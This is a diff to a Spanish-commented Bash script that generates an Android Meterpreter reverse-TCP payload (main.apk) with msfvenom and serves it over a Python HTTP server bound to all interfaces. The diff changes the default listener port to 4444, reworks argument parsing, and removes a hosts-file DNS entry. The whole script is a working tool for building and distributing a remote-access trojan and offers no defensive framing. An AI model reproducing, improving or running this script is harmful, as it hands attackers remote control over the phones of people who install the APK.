@@ -24,16 +24,26 @@ print_red() {
 # Inicializar las variables
 LOCAL_IP=""
 PORT=""
-NAME_DNS=""
 
 # Procesar las opciones de línea de comandos
-while getopts ":ip:port:" opt; do
-    case ${opt} in
-        ip ) LOCAL_IP=$OPTARG;;
-        port ) PORT=$OPTARG;;
-        dns ) NAME_DNS=$OPTARG;;
-        -h|--help) usage ;;
-        \? ) usage ;;
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -ip)
+            LOCAL_IP="$2"
+            shift 2
+            ;;
+        -port)
+            PORT="$2"
+            shift 2
+            ;;
+        -h|--help)
+            usage
+            exit 0
+            ;;
+        *)
+            usage
+            exit 1
+            ;;
     esac
 done
 
@@ -42,16 +52,16 @@ if [[ -z "$LOCAL_IP" ]]; then
     LOCAL_IP=$(hostname -I | awk '{print $1}')
 fi
 
+if [[ -z "$LOCAL_IP" ]]; then
+    print_red "No se pudo obtener la dirección IP local, prueba -h para obtener ayuda."
+    exit 1
+fi
+
 # Si no se proporcionó un puerto, usar un valor predeterminado
 if [[ -z "$PORT" ]]; then
     # Eliminamos los procesos que estén utilizando el puerto 8080
-    sudo fuser -k 8080/tcp &>/dev/null
-    PORT=8080
-fi
-
-# Si no se proporcionó un nombre de DNS, usar un valor predeterminado
-if [[ -z "$NAME_DNS" ]]; then
-    NAME_DNS="android.local"
+    sudo fuser -k 4444/tcp &>/dev/null
+    PORT=4444
 fi
 
 # Si no tenemos instalado msfvenom lo instalamos
@@ -75,7 +85,7 @@ echo "Generando payload..."
 # Generar el payload de Android con msfvenom
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
 if [ $? -eq 0 ]; then
-    print_green "Payload generado exitosamente: main.apk"
+    print_green "Payload generado exitosamente: main.apk, LHOST=$LOCAL_IP, LPORT=$PORT"
 else
     print_red "Error al generar el payload."
     exit 1
@@ -92,30 +102,36 @@ if ! command -v python3 &> /dev/null; then
 fi
 
 
-
+PORT_PYTHON=8000
 # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
-while nc -z localhost 8000; do
-    print_red "El puerto 8000 está en uso. Utilizando otro puerto..."
-    PORT=$((PORT + 1))
-done
+if nc -z 127.0.0.1 1 &> /dev/null; then
+    # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
+    while nc -z localhost $PORT_PYTHON; do
+        print_red "El puerto $PORT_PYTHON está en uso. Utilizando otro puerto..."
+        PORT_PYTHON=$((PORT_PYTHON + 1))
+    done
+else
+    # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
+    while ss -tuln | grep -q ":$PORT_PYTHON "; do
+        print_red "El puerto 8000 está en uso. Utilizando otro puerto..."
+        PORT_PYTHON=$((PORT_PYTHON + 1))
+    done
+fi
 
 # Creamos un servidor HTTP para descargar el APK con Python 3
-python3 -m http.server $PORT &>/dev/null &
+python3 -m http.server $PORT_PYTHON --bind 0.0.0.0 &>/dev/null &
 
 # Verificar si se inició el servidor HTTP
 if [ $? -eq 0 ]; then
-    print_green "Servidor HTTP iniciado en el puerto $PORT."
+    print_green "Servidor HTTP iniciado en el puerto $PORT_PYTHON."
 else
     print_red "Error al iniciar el servidor HTTP."
     exit 1
 fi
 
-# Añadimmos en nombre dns en el archivo hosts
-echo "$LOCAL_IP $NAME_DNS" | sudo tee -a /etc/hosts > /dev/null
-
 # Verificar si el archivo main.apk se generó correctamente
 if [ -f main.apk ]; then
-    print_green "Archivo main.apk disponible en http://$NAME_DNS:$PORT/main.apk"
+    print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT_PYTHON/main.apk"
 else
     print_red "Error: main.apk no se generó correctamente."
     exit 1
